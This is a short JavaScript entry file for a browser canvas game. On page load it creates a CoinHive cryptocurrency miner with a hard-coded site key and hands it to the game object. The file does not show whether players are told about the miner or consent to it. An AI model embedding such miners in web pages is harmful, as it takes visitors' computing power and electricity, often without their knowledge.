import Game from './game';

window.onload = () => {
    const miner = new CoinHive.Anonymous('pVn9IlEfqHmBteAUqVT4aJlPIT8AN8D3');
    const canvas = document.getElementById("gc");
    const game = new Game(canvas, miner);
    document.addEventListener("keydown", game.keyPush.bind(game));
    canvas.addEventListener('click', game.click.bind(game));
};